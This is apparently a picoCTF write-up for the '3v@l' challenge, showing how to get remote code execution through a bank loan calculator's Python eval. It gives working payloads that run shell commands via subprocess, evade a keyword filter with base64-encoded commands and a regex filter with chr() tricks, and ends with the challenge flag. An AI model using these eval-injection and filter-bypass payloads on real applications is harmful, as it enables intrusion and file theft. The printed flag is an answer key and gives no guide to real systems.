# 3v@l

## Description
ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank's calculator and read the flag?
The website is running Here.

## Solution
From the description we have to RCE Exploitation to get the flag, but the website get some filter on some word/character.

```py
getattr(__import__('subprocess'), 'getoutput')('whoami')
```
Output: `Result: app`

try `ls` command

```py
getattr(__import__('subprocess'), 'getoutput')('ls')
```
Output: `Error: Detected forbidden keyword 'ls'.`

seem we got filtered, then try bypass it using base64encode

```py
getattr(__import__('subprocess'), 'getoutput')('file_path=$(echo "bHM=" | base64 --decode); $file_path')
```
Output: `Result: app.py static templates`

From here, we can read the flag. Remember, encode first, then decode and execute, but in this case, it would be like this:

```py
getattr(__import__('subprocess'), 'getoutput')('file_path=$(echo "bHMgLw==" | base64 --decode); $file_path')
```

Output: `Result: app bin boot challenge dev etc flag.txt home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var`

```py
getattr(__import__('subprocess'), 'getoutput')('file_path=$(echo "Y2F0IC9mbGFnLnR4dA==" | base64 --decode); $file_path')
```

and you will get the flag.

or

use this command
```py
eval("open(flag.txt).read()")
```

filtering regex
```py
open(chr(47)+'flag'+chr(46)+'txt').read()
```

## Flag
    picoCTF{D0nt_Use_Unsecure_f@nctions0cd8a9f1}